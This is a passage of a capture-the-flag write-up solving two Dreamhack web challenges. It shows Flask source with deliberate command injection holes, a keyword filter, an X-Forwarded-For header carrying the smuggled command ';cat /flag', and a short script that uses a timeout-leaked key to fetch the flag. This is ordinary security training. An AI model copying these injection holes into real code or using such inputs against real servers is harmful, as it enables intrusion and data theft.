@app.route('/')
def flag():
    user_ip = request.access_route[0] if request.access_route else request.remote_addr
    try:
        result = run(
            ["/bin/bash", "-c", f"echo {user_ip}"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        return render_template("ip.html", result=result.stdout)

    except TimeoutExpired:
        return render_template("ip.html", result="Timeout!")


app.run(host='0.0.0.0', port=3000)
```

In this challenge, a vulnerability in command injection was exposed in the `user_ip` variable that the system retrieves. Using this, I added an `X-Forwarded-For` field to inject an IP and a command.

```shell
GET / HTTP/1.1
Host: host1.dreamhack.games:21554
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 0.0.0.0;cat /flag
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

---

## BypassIF

[Challenge](https://dreamhack.io/wargame/challenges/1151)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/3c6fd707-119d-4c71-9289-c6e39e08b736.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20241231%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20241231T084603Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=4a6ef366842edc94589c19c9bd6e1a3b805718807ad33daf9e414bdf439db20a)

```python
#!/usr/bin/env python3
import subprocess
from flask import Flask, request, render_template, redirect, url_for
import string
import os
import hashlib

app = Flask(__name__)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

KEY = hashlib.md5(FLAG.encode()).hexdigest()
guest_key = hashlib.md5(b"guest").hexdigest()

# filtering
def filter_cmd(cmd):
    alphabet = list(string.ascii_lowercase)
    alphabet.extend([' '])
    num = '0123456789'
    alphabet.extend(num)
    command_list = ['flag','cat','chmod','head','tail','less','awk','more','grep']

    for c in command_list:
        if c in cmd:
            return True
    for c in cmd:
        if c not in alphabet:
            return True

@app.route('/', methods=['GET', 'POST'])
def index():
    # GET request
    return render_template('index.html')



@app.route('/flag', methods=['POST'])
def flag():
     # POST request
    if request.method == 'POST':
        key = request.form.get('key', '')
        cmd = request.form.get('cmd_input', '')
        if cmd == '' and key == KEY:
            return render_template('flag.html', txt=FLAG)
        elif cmd == '' and key == guest_key:
            return render_template('guest.html', txt=f"guest key: {guest_key}")
        if cmd != '' or key == KEY:
            if not filter_cmd(cmd):
                try:
                    output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
                    return render_template('flag.html', txt=output.decode('utf-8'))
                except subprocess.TimeoutExpired:
                    return render_template('flag.html', txt=f'Timeout! Your key: {KEY}')
                except subprocess.CalledProcessError:
                    return render_template('flag.html', txt="Error!")
            return render_template('flag.html')
        else:
            return redirect('/')
    else: 
        return render_template('flag.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)
```

In this challenge, we see that there is a `cmd_input` variable without an input form, so we need to use `Burp Suite` to exploit it.

![pic1](./image/dreamhack/14.png)

However, at this point, it became quite challenging to further exploit the command injection vulnerability, so I focused on the part of the code related to the `TimeoutExpired error`

```python
try:
    output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
    return render_template('flag.html', txt=output.decode('utf-8'))
except subprocess.TimeoutExpired:
    return render_template('flag.html', txt=f'Timeout! Your key: {KEY}')
except subprocess.CalledProcessError:
    return render_template('flag.html', txt="Error!")
```

If `cmd_input` is inserted and exceeds the 5-second timeout for execution, it will trigger the `TimeoutExpired` error and print out the key. So, I set `cmd_input = "sleep 10"` to exploit this.

![pic2](./image/dreamhack/15.png)

Now that we have the `key` for the `FLAG`, we just need to input it into the key field to retrieve the `flag`

![pic3](./image/dreamhack/16.png)

`script`

```python
import requests
import hashlib
import string

url = "http://host1.dreamhack.games:13548/"

# input_data = {
#     "key": hashlib.md5(b"a").hexdigest(),
#     "cmd_input": "sleep 10"
# }
#key = 409ac0d96943d3da52f176ae9ff2b974

input_data = {
    "key": "409ac0d96943d3da52f176ae9ff2b974",
    "cmd_input": ""
}

req = requests.post(url+"flag", data=input_data)
print(req.text)
```

---